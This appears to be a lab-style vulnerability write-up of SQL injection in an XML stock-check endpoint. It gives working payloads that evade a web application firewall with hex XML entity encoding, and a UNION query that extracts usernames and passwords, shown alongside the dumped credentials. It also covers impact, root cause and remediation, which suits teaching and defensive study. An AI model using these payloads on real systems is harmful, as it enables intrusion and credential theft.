# SQL Injection with WAF Bypass in XML Endpoint
# SQL Injection with WAF Bypass in XML-Based Stock Check Endpoint

## Summary

A SQL Injection vulnerability was identified in the stock check functionality of the application. The endpoint processes XML input without proper sanitization, allowing manipulation of backend SQL queries.

Although a Web Application Firewall (WAF) is implemented to filter malicious input, it can be bypassed using XML entity encoding. This allows an attacker to execute arbitrary SQL queries and extract sensitive information, including user credentials.

---

## Vulnerable Endpoint

**Method:** POST
**Endpoint:** `/product/stock`
**Content-Type:** `application/xml`

**Vulnerable Parameter:**

```xml
<storeId>
```

---

## Technical Details

The application incorporates user input from the `<storeId>` element directly into a SQL query without proper validation. The backend query is inferred as:

```sql
SELECT stock FROM products WHERE storeId = [USER_INPUT]
```

A Web Application Firewall (WAF) is present and blocks common SQL injection patterns such as `UNION SELECT`. However, the filtering mechanism is insufficient and can be bypassed.

---

## Proof of Concept (PoC)

### 1. Confirm Injection

Modify the request:

```xml
<storeId>1+1</storeId>
```

**Result:**
The response changes, confirming that input is evaluated as part of the SQL query.

---

### 2. WAF Detection

Attempt a standard SQL injection:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

**Response:**

```
Attack detected
```

---

### 3. WAF Bypass

By encoding SQL keywords using XML entity encoding:

```xml
<storeId>1 &#x55;&#x4E;&#x49;&#x4F;&#x4E; &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54; NULL</storeId>
```

**Result:**
The request is accepted, confirming successful bypass of the WAF.

---

### 4. Data Extraction

Using a UNION-based payload with encoding:

```xml
<storeId>1 &#x55;&#x4E;&#x49;&#x4F;&#x4E; &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54; username||'~'||password &#x46;&#x52;&#x4F;&#x4D; users</storeId>
```

---

## Extracted Data

```
wiener~9jvyddkqm4jqx98gdnce
carlos~8xypdmtvn2ijgia8dc0h
administrator~53097ir62a41coifd9ee
```

---

## Impact

This vulnerability allows an attacker to:

* Bypass input filtering mechanisms (WAF)
* Execute arbitrary SQL queries
* Extract sensitive database information
* Retrieve user credentials in plaintext
* Gain administrative access to the application

**Severity: Critical**

---

## Root Cause

* Lack of input validation and sanitization
* Dynamic SQL query construction
* Over-reliance on WAF for security
* Inadequate filtering of encoded input

---

## Remediation

* Implement parameterized queries (prepared statements)
* Enforce strict validation of XML input (e.g., numeric-only values)
* Avoid dynamic SQL query construction
* Do not rely solely on WAF for security controls
* Normalize and decode input before applying filtering rules

---

## References

* OWASP Top 10 – A03: Injection
* https://owasp.org/www-community/attacks/SQL_Injection

---

## Conclusion

The SQL Injection vulnerability combined with a bypassable WAF enables full database data extraction and administrative account compromise. The issue is critical and should be addressed immediately by implementing secure coding practices and proper input handling.
